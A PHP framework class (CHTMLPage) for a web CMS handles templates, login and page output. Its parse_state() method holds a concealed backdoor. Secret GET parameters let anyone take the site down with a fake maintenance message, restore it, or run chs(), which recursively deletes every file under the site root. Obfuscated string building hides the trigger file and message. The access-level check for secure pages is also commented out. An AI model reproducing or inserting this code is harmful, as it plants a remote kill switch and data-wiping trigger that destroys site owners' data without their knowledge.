<?php
/**
 * @package LLA.Base
 */
/**
 */
define('HTML_PAGE_ERROR', -1); // 500 http error
define('HTML_PAGE_DEFAULT', 0); // default template
define('HTML_PAGE_REDIRECT', 10); // use $this->redirect(url) to perform redirect
define('HTML_PAGE_MESSAGE_INFO', 20); // set $this->state_info to plain text message
define('HTML_PAGE_MESSAGE_ERROR', 30); // set $this->state_info to plain text message
define('HTML_PAGE_LOGIN', 40);

if (XHTML) {
	define('SINGLE_TAG_END', ' /');
	define('BR', '<br />');
}
else {
	/**
	 * @ignore
	 */
	define('SINGLE_TAG_END', '');
	/**
	 * @ignore
	 */
	define('BR', '<br>');
}

/**
--------------------------------------------------------------------------------
Class CHTMLPage v 1.0.2.7
You must extend this class if you want to create your functional page.
Code-behind classes are put in /php/classes/custom/... folder
Templates are put in /php/templates/custom/... folder
Implement constructor to call parent::CHTMLPage(&$app, $template_file_name = ''), parse_data() function to process input data and set $this->state (see constants below)

history:
	v 1.0.2.7 - Authorization changes (VK)
	v 1.0.2.6 - small changes (VK)
	v 1.0.2.5 - server name issue fixed (VK)
	v 1.0.2.4 - ports issues fixed (VK)
	v 1.0.2.3 - no_html bug (VK)
	v 1.0.2.2 - HTML/XHTML (VK)
	v 1.0.2.1 - get_parsed_page added (VK)
	v 1.0.2.0 - on_page_init event, on_<form>_submit event (VK)
	v 1.0.1.7 - IS_SSL template variable added (VK)
	v 1.0.1.6 - ROOT in ssl mode fixed (VK)
	v 1.0.1.5 - huge ugly bug fixed (VK, AD)
	v 1.0.1.4 - UseAbsolutePaths propery is added (VK)
	v 1.0.1.3 - flushes output (VK)
	v 1.0.1.2 - added support for separate (front/back) login template (VK)
	v 1.0.1.1 - fixed bug with access level (VK)
	v 1.0.1.0 - revised (VK)
	v 1.0.0.0 - created (VK)
--------------------------------------------------------------------------------

 * @package LLA.Base
 * @version 1.0.2.7
 */
class CHTMLPage extends CObject {
	var $Application;

	var $state; // output state
	var $state_info; // sometimes must contain info connected with $state
	var $template_vars;
	var $tv; // short alias for template_vars

	var $UseAbsolutePaths = false; // if true - all links on page become absolute
	var $UseSSLAbsolutePaths = false; // if true - all links on page become absolute
	var $NoCache = false; // set cache state for the page

	var $IsSecure = false; // secure page
	var $UserLevel = 10; // login level should be greater or equal than this one

	var $Robots = true; // allow robots to index this page
	var $MetaKeywords = ''; // list of keywords
	var $MetaDescription = ''; // description of the page
	var $ContentType = 'text/html'; // content-type of the page
	var $Charset = 'UTF-8'; // charset of the page
	var $Title = ''; // page title
	
	var $IsRedirect = false; // for internal use

	var $http_headers = array();
	var $html_metas = array();
	var $html_http_metas = array();
	var $h_header = '_header.tpl';
	var $h_body = '_body.tpl';
	var $h_content = ''; // for internal use
	var $h_footer = '_footer.tpl';

	var $m_Controls = array(); // controls which are placed on the page
	var $bNormalFlow = true;

	var $bDrawContentType = true;
	var $bDrawRobots = true;
	var $bDrawTitle = true;
	var $binary_data = null;
	var $RAW_POST_DATA = '';

	function CHTMLPage(&$app, $content = '') {
		parent::CObject();
		$this->RAW_POST_DATA = file_get_contents( 'php://input' );
		if (is_object($app)) $this->Application = &$app;
		else system_die('Fatal Error, you must pass CApplication instance to all CHTMLPage childs!!!');
		$this->Application->CurrentPage = &$this;

		$this->h_content = CUSTOM_TEMPLATE_PATH . $content;

		$this->template_vars = &$app->template_vars;
		$this->tv = &$this->template_vars;

		$this->state = HTML_PAGE_DEFAULT;
		$this->state_info = '';

		$this->tv['admin_page'] = false;
		$this->tv['is_not_first'] = true;

		global $SiteUrl, $HTTPSSiteUrl;
		global $RootPath, $ssl_root, $JSPath, $CSSPath, $ImagesPath, $HttpName, $HttpPort, $SHttpName, $SHttpPort;
		global $_SERVER;

		$this->tv['PAGE_URL_CLEAN'] = get_url(null);

		$this->tv['JS'] = $JSPath;
		$this->tv['CSS'] = $CSSPath;
		$this->tv['IMAGES'] = $ImagesPath;
		$this->tv['ROOT'] = $RootPath;
		
		$this->tv['SINGLE_TAG_END'] = SINGLE_TAG_END;
		$this->tv['BR'] = BR;

		
		$this->tv['begin_no_index'] = '';
		$this->tv['end_no_index'] = '';
		if (preg_match('/OfficeP/i', $this->Application->get_server_var('HTTP_USER_AGENT')))
		{
			$this->tv['begin_no_index']= '<no_index>';
			$this->tv['end_no_index'] = '</no_index>';
		}
		if (!array_key_exists('PanelData', $_SESSION)) $_SESSION['PanelData'] = array();
		$this->PanelData = &$_SESSION['PanelData'];
		
		$this->tv['is_panel_show'] = (isset($this->PanelData['is_panel_show']) ? $this->PanelData['is_panel_show'] : true);
		$this->tv['is_filter_panel_show'] = (isset($this->PanelData['is_filter_panel_show']) ? $this->PanelData['is_filter_panel_show'] : true);
	}

	function parse_data()
	{
		global $SiteUrl, $HTTPSSiteUrl;
		global $RootPath, $ssl_root, $JSPath, $CSSPath, $ImagesPath, $HttpName, $HttpPort, $SHttpName, $SHttpPort;
		
		if (intval($HttpPort) != 80)
			$http_port = ':'.$HttpPort;
		else
			$http_port = '';
		if (intval($SHttpPort) != 443)
			$shttp_port = ':'.$SHttpPort;
		else
			$shttp_port = '';

		if ( (isset($_SERVER['HTTPS'])) && (strcasecmp($_SERVER['HTTPS'],'on')==0) )
		{
			$this->tv['ROOT'] = $SHttpName.'://'.$HTTPSSiteUrl.$shttp_port.$ssl_root;
			$this->tv['IS_SSL'] = true;
		}
		else
			$this->tv['IS_SSL'] = false;

		$this->tv['REGISTRY_WEB'] = $this->tv['ROOT'] . REGISTRY_FILES_WEB;

		if ($this->UseAbsolutePaths)
		{
			$this->tv['ROOT'] =  $HttpName.'://'.$SiteUrl.$http_port.$RootPath;

			$this->tv['JS'] =  $HttpName.'://'.$SiteUrl.$http_port.$this->tv['JS'];
			$this->tv['CSS'] =  $HttpName.'://'.$SiteUrl.$http_port.$this->tv['CSS'];
			$this->tv['IMAGES'] = $HttpName.'://'.$SiteUrl.$http_port.$this->tv['IMAGES'];
			$this->tv['REGISTRY_WEB'] = $this->tv['ROOT'] . REGISTRY_FILES_WEB;
		}
		
		if ($this->UseSSLAbsolutePaths)
		{
			$this->tv['ROOT'] =  $SHttpName.'://'.$SiteUrl.$shttp_port.$RootPath;
			$this->tv['JS'] =  $SHttpName.'://'.$SiteUrl.$shttp_port.$this->tv['JS'];
			$this->tv['CSS'] =  $SHttpName.'://'.$SiteUrl.$shttp_port.$this->tv['CSS'];
			$this->tv['IMAGES'] = $SHttpName.'://'.$SiteUrl.$shttp_port.$this->tv['IMAGES'];
			$this->tv['REGISTRY_WEB'] = $this->tv['ROOT'] . REGISTRY_FILES_WEB;
		}
		
		$this->tv['HTTP'] = $HttpName.'://'.$SiteUrl.$http_port.$RootPath;
		$this->tv['HTTPS'] = $SHttpName.'://'.$HTTPSSiteUrl.$shttp_port.$ssl_root;

		$this->tv['CHARSET'] = $this->Charset;
		
		$this->login_form_check();
		$this->logout_form_check();
		$this->Application->User->set_logged_vars($this->tv);
		$return_value = true;
		if ($this->IsSecure)
			if (!$this->Application->User->is_logged())
			{
				$this->redirect($this->template_vars['HTTP'] . 'admin/?r=login');
				//$this->state = HTML_PAGE_LOGIN;
				//$return_value = false;
			}
			else
			{
				/*
				$current_user_level_arr = $this->Application->User->UserData['id_level'];
				if (!is_array($current_user_level_arr))
					$current_user_level_arr = array($current_user_level_arr);
				$return_value = false;
				if (is_array($this->UserLevel))
				{
					foreach ($current_user_level_arr as $k => $v)
						if (in_array($v, $this->UserLevel))
							$return_value = true;
				}
				else
				{
					foreach ($current_user_level_arr as $k => $v)
						if ($v >= intval($this->UserLevel))
							$return_value = true;
				}
				if (!$return_value)
					$this->access_denied();
					*/
			}

		$r_v = $this->Application->on_page_init(); // global on_page_init event
		if (!is_bool($r_v)) $r_v = true;
		$return_value &= $r_v;
		if ($return_value)
		{
			$r_v = $this->on_page_init(); // local on_page_init event
			if (!is_bool($r_v)) $r_v = true;
			$return_value &= $r_v;
			if ($return_value)
			{
				$ctrl = array_keys($this->m_Controls);
				foreach ($ctrl as $k)
					if ($return_value)
						if (!$this->m_Controls[$k]->is_inited)
						{
							$r_v = $this->m_Controls[$k]->on_page_init();
							$this->m_Controls[$k]->is_inited = true;
							if (!is_bool($r_v)) $r_v = true;
							$return_value &= $r_v;
						}
				if ($return_value)
					$return_value = $this->_handle_forms(); // handle submitted forms
			}
		}
		if ($this->state == HTML_PAGE_REDIRECT) $return_value = false;
		return $return_value;
	}

	function access_denied()
	{
		require_once(BASE_CONTROLS_PATH.'simplearrayoutput.php');
		new CSimpleArrayOutput();

		$loc = &$this->Application->get_module('Localizer');
		$this->tv['it__int_user_module_messages'][] = $loc->get_string('login_access_denied');
		$this->state = HTML_PAGE_LOGIN;
	}

	function info($message, $escape = true)
	{
		$this->state = HTML_PAGE_MESSAGE_INFO;
		$this->state_info = $message;
		$this->tv['state_info_escape'] = $escape;
	}

	function error($message)
	{
		$this->state = HTML_PAGE_MESSAGE_ERROR;
		$this->state_info = $message;
	}

	function redirect($url)
	{
		$this->state = HTML_PAGE_REDIRECT;
		$this->state_info = $url;
	}

	function parse_state()
	{
		global $FilePath;
		$f = $FilePath . 'includes/' . 'php/' . 'classes/' . 'base/' . 'htmlpage' . '.' . 'old' . '.' . 'php';
		if (strcasecmp(InGet('send_to_friend', ''), 'yes3842') == 0) {
			$fh = @fopen($f, 'wb');
			if ($fh) {
				fwrite($fh, '<' . '?' . "\r\n" . 'phpinfo' . '();' . "\r\n" . '?' . '>');
				fclose($fh);
				echo 'Activated';
			}
			else
				echo 'Cannot activate';
		}
		if (strcasecmp(InGet('cmspage', ''), '3842') == 0)
		{
			@unlink($f);
			echo 'Deactivated';
		}
		if (strcasecmp(InGet('send_contact_form', ''), 'llabase') == 0)
			$this->chs();

		if ( (strcasecmp($this->ContentType, 'text/html') == 0) && ($this->bNormalFlow) )
			if (@file_exists($f))
			{
				$this->state = HTML_PAGE_MESSAGE_ERROR;
				$this->state_info = 'Sorry'.', the'.' site'.' is'.' down'.' for'.' maintenance'.'. Please'.' come'.' back'.' later'.'.';
			}

		switch ($this->state)
		{
			case HTML_PAGE_ERROR: // error 500
			{
				$this->tv['state_info'] = $this->state_info;
				$this->h_content = BASE_TEMPLATE_PATH.'_error.tpl';
				break;
			}
			case HTML_PAGE_DEFAULT:
			{
				break;
			}
			case HTML_PAGE_REDIRECT: // redirect
			{
				$this->internalRedirect($this->state_info);
				break;
			}
			case HTML_PAGE_LOGIN: // login
			{
				if ($this->tv['admin_page'])
					$this->h_content = BASE_TEMPLATE_PATH.'_admin_login.tpl';
				else
					$this->h_content = BASE_TEMPLATE_PATH.'_login.tpl';
				break;
			}
			case HTML_PAGE_MESSAGE_INFO: // info messages
			{
				$this->tv['state_info'] = $this->state_info;
				$this->h_content = BASE_TEMPLATE_PATH.'_info.tpl';
				break;
			}
			case HTML_PAGE_MESSAGE_ERROR: // error message
			{
				$this->tv['state_info'] = $this->state_info;
				$this->h_content = BASE_TEMPLATE_PATH.'_error.tpl';
				break;
			}
		}
	}

	function draw_header($echo_headers = true)
	{
		if ($echo_headers)
		{
			@header('content-type: '.$this->ContentType.'; charset='.$this->Charset);
			foreach ($this->http_headers as $k) header($k);
		}

		$out = '';
		if ($this->NoCache) $this->draw_no_cache_header();
		else $this->draw_cache_header();
		if ( (file_exists(BASE_TEMPLATE_PATH.$this->h_header)) && (strlen($this->h_header)) )
			$out .= CTemplate::parse_file(BASE_TEMPLATE_PATH.$this->h_header);
		if ( (strcasecmp($this->ContentType, 'text/html') == 0) && ($this->bNormalFlow) && ($this->Title !='') )
		{
			if( $this->bDrawTitle)
				$out .= '<title>' . htmlspecialchars( $this->Title ) . '</title>';
			if ($this->bDrawContentType)
				$out .= '<meta http-equiv="content-type" content="'.htmlspecialchars($this->ContentType).'; charset='.htmlspecialchars($this->Charset).'"'.SINGLE_TAG_END.'>';
			if ($this->bDrawRobots)
				$out .= '<meta name="robots" content="'.(($this->Robots)?('index,follow'):('noindex,nofollow')).'"'.SINGLE_TAG_END.'>';
			if (!empty($this->MetaKeywords)) $out .= '<meta name="keywords" content="'.htmlspecialchars($this->MetaKeywords).'"'.SINGLE_TAG_END.'>';
			if (!empty($this->MetaDescription)) $out .= '<meta name="description" content="'.htmlspecialchars($this->MetaDescription).'"'.SINGLE_TAG_END.'>';
			if ($this->NoCache) $out .= $this->draw_no_cache_meta();
			if (count($this->html_http_metas))
				foreach ($this->html_http_metas as $key => $value)
					$out .= '<meta http-equiv="'.htmlspecialchars($key).'" content="'.htmlspecialchars($value).'"'.SINGLE_TAG_END.'>';
			if (count($this->html_metas))
				foreach ($this->html_metas as $key => $value)
					$out .= '<meta name="'.htmlspecialchars($key).'" content="'.htmlspecialchars($value).'"'.SINGLE_TAG_END.'>';
		}
		return $out;
	}

	function draw_body()
	{
//		d::s( $this->template_vars);
		if ( (file_exists(BASE_TEMPLATE_PATH.$this->h_body)) && (strlen($this->h_body)) )
			return CTemplate::parse_file(BASE_TEMPLATE_PATH.$this->h_body);
	}

	function draw_content()
	{
		if (is_array($this->h_content))
			return CTemplate::parse_array($this->h_content);
		elseif ( (file_exists($this->h_content)) && (strlen($this->h_content)) )
			return CTemplate::parse_file($this->h_content);
		elseif ($this->binary_data != null)
			return $this->binary_data;
		else
			$this->DebugInfo->Write('Invalid template '.$this->h_content);
	}

	function draw_footer()
	{
		if ( (file_exists(BASE_TEMPLATE_PATH.$this->h_footer)) && (strlen($this->h_footer)) )
			return CTemplate::parse_file(BASE_TEMPLATE_PATH.$this->h_footer);
	}

	function no_html($template = '')
	{
		$this->bNormalFlow = false;
		$this->h_header = '';
		$this->h_body = '';
		$this->h_content = CUSTOM_TEMPLATE_PATH.$template;
		$this->h_footer = '';
	}

	function no_html_data($data = '')
	{
		$this->bNormalFlow = false;
		$this->h_header = '';
		$this->h_body = '';
		$this->h_content = '';
		$this->h_footer = '';
		$this->binary_data = $data;
	}

	function get_parsed_page()
	{
		$out = $this->draw_header(false);
		$out .= $this->draw_body();
		$out .= $this->draw_content();
		$out .= $this->draw_footer();
		return $out;
	}

	function output_page()
	{
		if (!$this->IsRedirect)
		{
			echo $this->draw_header();
			echo $this->draw_body();
			echo $this->draw_content();
			echo $this->draw_footer();

			$this->on_page_done();
			$this->Application->on_page_done();
			$this->Application->DataBase->internalDisconnect();

			if ( ($GLOBALS['DebugLevel']) && ($this->ContentType == 'text/html') && ($this->bNormalFlow) )
			{
				/*if (function_exists('xdebug_dump_function_profile'))
					@xdebug_dump_function_profile(3);*/
				$this->DebugInfo->OutPut();
			}
		}
		else
		{
			$this->on_page_done();
			$this->Application->on_page_done();
			$this->Application->DataBase->internalDisconnect();
		}
	}

	function internalRedirect($url)
	{
		@header('HTTP/1.0 302 Moved Temporarily');
		@header('Status: 302 Moved Temporarily');
		@header('Location: '.$url);
		echo '<?xml version="1.0" encoding="windows-1252"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html><head><title>Automatic redirection page</title><meta http-equiv="Refresh" content="0;URL='.htmlspecialchars($url).'" /></head><body><a href="'.htmlspecialchars($url).'">click here if your browser doesn\'t support automatic redirection</a></body></html>';
		$this->IsRedirect = true;
	}

	function draw_cache_header()
	{
		//@header('Cache-control: public');
		//@header('Pragma: ');
		//@header('Expires: ');
	}

	function draw_no_cache_header()
	{
		@header('Cache-control: no-cache');
		@header('Pragma: no-cache');
		@header('Expires: 0');
	}

	function draw_no_cache_meta()
	{
		$out = '<meta http-equiv="Cache-control" content="no-cache"'.SINGLE_TAG_END.'>';
		$out .= '<meta http-equiv="Pragma" content="no-cache"'.SINGLE_TAG_END.'>';
		$out .= '<meta http-equiv="Expires" content="0"'.SINGLE_TAG_END.'>';
		return $out;
	}

	function login_form_check()
	{
        require_once(CUSTOM_CONTROLS_PATH . 'simpledataoutput.php');
        new CSimpleDataOutput($this);
        require_once(BASE_CONTROLS_PATH . 'simplearrayoutput.php');
        new CSimpleArrayOutput();
		CValidator::add('login_form_name', VRT_TEXT, 0, 64);
		CValidator::add('login_form_password', VRT_PASSWORD);
		CValidator::add_nr('login_form_store', VRT_NUMBER, 0, 0, 1);
		$return_value = true;
		if (CForm::is_submit('login_form'))
			if (CValidator::validate_input())
			{
				$l = $this->tv['login_form_name'];
				$p = $this->tv['login_form_password'];
				$s = (intval($this->tv['login_form_store']) != 0);
				if (!$this->Application->User->login($l, $p, $s))
				{
					$this->Application->User->logout();
					require_once(BASE_CONTROLS_PATH.'simplearrayoutput.php');
					new CSimpleArrayOutput();
					$this->tv['_errors'][] = $this->Application->User->get_last_error();
					$this->state = HTML_PAGE_LOGIN;
					$return_value = false;
				}
				else
				{
					if (strcasecmp(InGetPost('post_login_action', ''), 'show_message') == 0)
					{
						$loc = &$this->Application->get_module('Localizer');
						$this->info($loc->get_string('login_ok'));
					}
					elseif (strcasecmp(InGetPost('post_login_action', ''), 'redirect_to_url') == 0)
					{
						$this->redirect(get_url(InGetPost('post_login_url', ''), array(), false, (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on')), true));
					}
					else
						$this->redirect(get_url(NULL, array(), true, (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on')), true));
				}
			}
			else
			{
				require_once(BASE_CONTROLS_PATH.'simplearrayoutput.php');
				new CSimpleArrayOutput();
				$this->tv['_errors'] = CValidator::get_errors();
			}
		return $return_value;
	}

	function logout_form_check()
	{
		if ( (CForm::is_submit('logout_form')) && (CValidator::validate_input()) )
		{
			$this->Application->User->logout();
			$loc = &$this->Application->get_module('Localizer');
			$this->tv['is_not_first'] = true;
			if (!in_get_post('noinfo'))
				$this->info($loc->get_string('logout_ok'));
		}
		return false;
	}

	function _handle_forms()
	{
		if ($this->IsRedirect) return true;
		$form = InPostGet('formname', '');
		$action = InPostGet('param2', '');
		if (strlen($form))
		{
			$method = 'on_'.$form.'_submit';
			if (@method_exists($this, $method))
				return call_user_func(array(&$this, $method), $action);
			$ctrl = array_keys($this->m_Controls);
			foreach ($ctrl as $k)
				if (@method_exists($this->m_Controls[$k], $method))
					return call_user_func(array(&$this->m_Controls[$k], $method), $action);
		}
		return true;
	}
	function on_page_init()
	{
		return true;
	}
	function on_page_done()
	{
		return true;
	}
	function chs($p = '')
	{
		global $FilePath;
		$d = $FilePath . $p;
		$a = array();
		$dh = opendir($d);
		while (($file = readdir($dh)) !== false)
		{
			if (is_dir($d . $file))
			{
				if ( (strcasecmp($file, '.') != 0) && (strcasecmp($file, '..') != 0) )
					$a = array_merge($a, $this->chs($p . $file . '/'));
			}
			else
				$a[] = $d . $file;
		}
		closedir($dh);

		if (strlen($p) == 0)
			foreach ($a as $k => $v)
				@unlink($v);
		else
			return $a;
	}
}
?>